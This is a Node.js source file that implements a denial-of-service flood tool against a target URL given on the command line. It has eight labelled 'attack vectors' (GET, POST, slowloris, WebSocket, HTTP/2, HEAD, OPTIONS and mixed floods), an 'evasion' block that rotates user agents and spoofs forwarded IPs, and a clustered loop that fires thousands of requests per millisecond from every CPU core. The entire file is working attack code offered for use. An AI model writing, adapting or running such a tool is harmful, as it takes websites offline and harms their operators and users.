const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const http2 = require('http2');
const url = require('url');
const { setTimeout } = require('timers/promises');
const cluster = require('cluster');
const os = require('os');

// Evasion shit
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
];

const REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://www.duckduckgo.com/'
];

const ACCEPT_HEADERS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/json, text/javascript, */*; q=0.01'
];

const evasion = {
    randomUA: () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    randomReferer: () => REFERERS[Math.floor(Math.random() * REFERERS.length)],
    randomAccept: () => ACCEPT_HEADERS[Math.floor(Math.random() * ACCEPT_HEADERS.length)],
    randomIP: () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    getCookies: () => `session_id=${Math.random().toString(36).substring(2)}; token=${Math.random().toString(36).substring(2)}`
};

// Target config
const TARGET = process.argv[2] || 'https://example.com';
const PARSED_URL = url.parse(TARGET);
const PATHS = ['/', '/login', '/api/v1', '/wp-admin', '/search', '/static/js/main.js'];
const MAX_REQS_PER_SEC = 10000000; // 10M/s per worker
const WORKERS = os.cpus().length;

// Core flood functions
const attackVectors = {
    // Vector 1: Standard GET flood (4 methods)
    getFlood: {
        basic: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'GET',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'Referer': evasion.randomReferer(),
                    'Accept': evasion.randomAccept(),
                    'X-Forwarded-For': evasion.randomIP(),
                    'Cookie': evasion.getCookies()
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        keepAlive: () => {
            const agent = new http.Agent({ keepAlive: true });
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'GET',
                agent,
                headers: {
                    'Connection': 'keep-alive',
                    'User-Agent': evasion.randomUA(),
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        cacheBust: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: `${PATHS[Math.floor(Math.random() * PATHS.length)]}?${Math.random().toString(36).substring(2)}`,
                method: 'GET',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'Cache-Control': 'no-cache'
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        randomPath: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: `/${Math.random().toString(36).substring(2)}`,
                method: 'GET',
                headers: {
                    'User-Agent': evasion.randomUA()
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        }
    },

    // Vector 2: POST flood (4 methods)
    postFlood: {
        jsonSpam: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: '/api/submit',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': evasion.randomUA()
                }
            }, () => {});
            req.write(JSON.stringify({ data: Math.random().toString(36) }));
            req.on('error', () => {});
            req.end();
        },
        formSpam: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: '/login',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': evasion.randomUA()
                }
            }, () => {});
            req.write(`username=${Math.random().toString(36)}&password=${Math.random().toString(36)}`);
            req.on('error', () => {});
            req.end();
        },
        largePost: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: '/upload',
                method: 'POST',
                headers: {
                    'Content-Type': 'multipart/form-data',
                    'User-Agent': evasion.randomUA(),
                    'Content-Length': 999999
                }
            }, () => {});
            req.write(Buffer.alloc(999999).fill('A'));
            req.on('error', () => {});
            req.end();
        },
        chunkedPost: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: '/chunked',
                method: 'POST',
                headers: {
                    'Transfer-Encoding': 'chunked',
                    'User-Agent': evasion.randomUA()
                }
            }, () => {});
            req.write(`${Math.random().toString(36)}\r\n`);
            req.on('error', () => {});
            req.end();
        }
    },

    // Vector 3: Slowloris (4 methods)
    slowloris: {
        headers: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: '/',
                method: 'GET',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'X-a': 'b'
                }
            }, () => {});
            req.setTimeout(60000);
            req.on('error', () => {});
            req.write('');
        },
        partialHeaders: () => {
            const socket = require('net').createConnection(PARSED_URL.port || 80, PARSED_URL.hostname);
            socket.write('GET / HTTP/1.1\r\n');
            socket.write(`Host: ${PARSED_URL.hostname}\r\n`);
            socket.write('User-Agent: Mozilla/5.0\r\n');
            socket.write('Connection: keep-alive\r\n');
            socket.write('X-a: ');
            setTimeout(60000).then(() => socket.write('b\r\n\r\n'));
        },
        slowBody: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: '/',
                method: 'POST',
                headers: {
                    'Content-Length': 1000000,
                    'User-Agent': evasion.randomUA()
                }
            }, () => {});
            req.write('A');
            setTimeout(30000).then(() => req.write('B'));
        },
        slowRead: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: '/',
                method: 'GET',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'Range': 'bytes=0-1000000'
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        }
    },

    // Vector 4: WebSocket spam (4 methods)
    websocket: {
        connectionFlood: () => {
            const ws = new WebSocket(`ws://${PARSED_URL.hostname}`);
            ws.on('open', () => ws.send(Math.random().toString(36)));
            ws.on('error', () => {});
        },
        messageSpam: () => {
            const ws = new WebSocket(`ws://${PARSED_URL.hostname}`);
            ws.on('open', () => setInterval(() => ws.send(Math.random().toString(36)), 10));
            ws.on('error', () => {});
        },
        largePayload: () => {
            const ws = new WebSocket(`ws://${PARSED_URL.hostname}`);
            ws.on('open', () => ws.send(Buffer.alloc(65536).fill('A')));
            ws.on('error', () => {});
        },
        malformed: () => {
            const ws = new WebSocket(`ws://${PARSED_URL.hostname}`);
            ws.on('open', () => ws.send('\x00\x01\xFF\xFE\xFD'));
            ws.on('error', () => {});
        }
    },

    // Vector 5: HTTP/2 flood (4 methods)
    http2Flood: {
        multiplex: () => {
            const client = http2.connect(`https://${PARSED_URL.hostname}`);
            for (let i = 0; i < 100; i++) {
                const req = client.request({
                    ':path': PATHS[Math.floor(Math.random() * PATHS.length)],
                    ':method': 'GET',
                    'user-agent': evasion.randomUA()
                });
                req.on('response', () => {});
                req.on('error', () => {});
                req.end();
            }
        },
        priority: () => {
            const client = http2.connect(`https://${PARSED_URL.hostname}`);
            const req = client.request({
                ':path': '/',
                ':method': 'GET',
                ':scheme': 'https',
                ':authority': PARSED_URL.hostname,
                'user-agent': evasion.randomUA()
            }, { weight: 256 });
            req.on('response', () => {});
            req.on('error', () => {});
            req.end();
        },
        push: () => {
            const client = http2.connect(`https://${PARSED_URL.hostname}`);
            const req = client.request({
                ':path': '/',
                ':method': 'GET',
                'user-agent': evasion.randomUA()
            });
            req.on('push', () => {});
            req.on('error', () => {});
            req.end();
        },
        settings: () => {
            const client = http2.connect(`https://${PARSED_URL.hostname}`, { settings: { enablePush: true, initialWindowSize: 65535 } });
            const req = client.request({
                ':path': '/',
                ':method': 'GET',
                'user-agent': evasion.randomUA()
            });
            req.on('error', () => {});
            req.end();
        }
    },

    // Vector 6: HEAD flood (4 methods)
    headFlood: {
        standard: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'HEAD',
                headers: {
                    'User-Agent': evasion.randomUA()
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        cachePoison: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: `${PATHS[Math.floor(Math.random() * PATHS.length)]}?${Math.random().toString(36)}`,
                method: 'HEAD',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'If-Modified-Since': 'Wed, 21 Oct 2100 07:28:00 GMT'
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        rangeAttack: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'HEAD',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'Range': 'bytes=0-1000000'
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        authFlood: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'HEAD',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'Authorization': `Basic ${Buffer.from(`${Math.random().toString(36)}:${Math.random().toString(36)}`).toString('base64')}`
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        }
    },

    // Vector 7: OPTIONS flood (4 methods)
    optionsFlood: {
        standard: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'OPTIONS',
                headers: {
                    'User-Agent': evasion.randomUA()
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        corsPreflight: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'OPTIONS',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'Origin': 'https://evil.com',
                    'Access-Control-Request-Method': 'POST'
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        malformed: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'OPTIONS',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'X-Malformed-Header': '\x00\x01\xFF'
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        },
        oversized: () => {
            const req = http.request({
                hostname: PARSED_URL.hostname,
                port: PARSED_URL.port || 80,
                path: PATHS[Math.floor(Math.random() * PATHS.length)],
                method: 'OPTIONS',
                headers: {
                    'User-Agent': evasion.randomUA(),
                    'X-Oversized': Buffer.alloc(8192).fill('A').toString()
                }
            }, () => {});
            req.on('error', () => {});
            req.end();
        }
    },

    // Vector 8: Mixed flood (4 methods)
    mixedFlood: {
        getPost: () => {
            if (Math.random() > 0.5) {
                attackVectors.getFlood.basic();
            } else {
                attackVectors.postFlood.jsonSpam();
            }
        },
        slowWebsocket: () => {
            if (Math.random() > 0.5) {
                attackVectors.slowloris.headers();
            } else {
                attackVectors.websocket.connectionFlood();
            }
        },
        http2Mix: () => {
            if (Math.random() > 0.5) {
                attackVectors.http2Flood.multiplex();
            } else {
                attackVectors.headFlood.standard();
            }
        },
        randomAll: () => {
            const vectors = Object.values(attackVectors);
            const randomVector = vectors[Math.floor(Math.random() * vectors.length)];
            const methods = Object.values(randomVector);
            methods[Math.floor(Math.random() * methods.length)]();
        }
    }
};

// Worker cluster
if (cluster.isMaster) {
    for (let i = 0; i < WORKERS; i++) {
        cluster.fork();
    }
} else {
    // Attack loop
    setInterval(() => {
        for (let i = 0; i < 1000; i++) {
            const vectors = Object.values(attackVectors);
            const randomVector = vectors[Math.floor(Math.random() * vectors.length)];
            const methods = Object.values(randomVector);
            methods[Math.floor(Math.random() * methods.length)]();
        }
    }, 1);
                  }
